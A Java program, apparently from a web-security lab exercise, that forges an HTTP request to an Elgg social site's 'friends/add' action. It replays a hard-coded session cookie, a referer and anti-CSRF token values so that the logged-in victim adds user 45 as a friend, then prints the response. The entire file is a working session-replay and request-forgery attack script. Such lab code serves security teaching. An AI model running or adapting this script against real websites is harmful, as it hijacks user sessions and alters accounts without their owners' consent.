import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.*;
public class HttpSimpleForge {
	public static void main(String[] args) {
		int responceCode;
		InputStream responceIn = null;
		String requestDetail = "&__elgg_ts=1433248508&__elgg_token=9e3382dbf220333204ce7dc205f5091d";
		try {
			 URL url = new URL("http://www.xsslabelgg.com/action/friends/add?friend=45");
			 HttpURLConnection urlConnection = (HttpURLConnection)url.openConnection();
			 if (urlConnection instanceof HttpURLConnection) {
				urlConnection.setConnectTimeout(60000);
				urlConnection.setReadTimeout(90000);
			}
			 urlConnection.addRequestProperty("Host", "www.xsslabelgg.com");
			 urlConnection.addRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
			 urlConnection.addRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			 urlConnection.addRequestProperty("Accept-Language", "en-US,en;q=0.5");
			 urlConnection.addRequestProperty("Referer", "http://www.xsslabelgg.com/profile/Chaire");
			 urlConnection.addRequestProperty("Cookie", "Elgg=pr0j591o9bho46vr4kada2dk27");
			 urlConnection.addRequestProperty("Connection", "keep-alive");
			 String data = "name=...&guid=...";
			 urlConnection.setDoOutput(true);
			 OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream());
			 writer.write(data);
			 writer.flush();
			 if (urlConnection instanceof HttpURLConnection) {
				HttpURLConnection httpURLConnection = (HttpURLConnection)urlConnection;
				responceCode = httpURLConnection.getResponseCode();
				System.out.println("Responce Code = "+responceCode);
				if (responceCode==HttpURLConnection.HTTP_OK||responceCode == 302) {
					responceIn = urlConnection.getInputStream();
					BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responceIn));
					String inputLine;
					while((inputLine=buf_inp.readLine())!=null){
						System.out.println(inputLine);
					}
				}
			 }
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		
	}

}
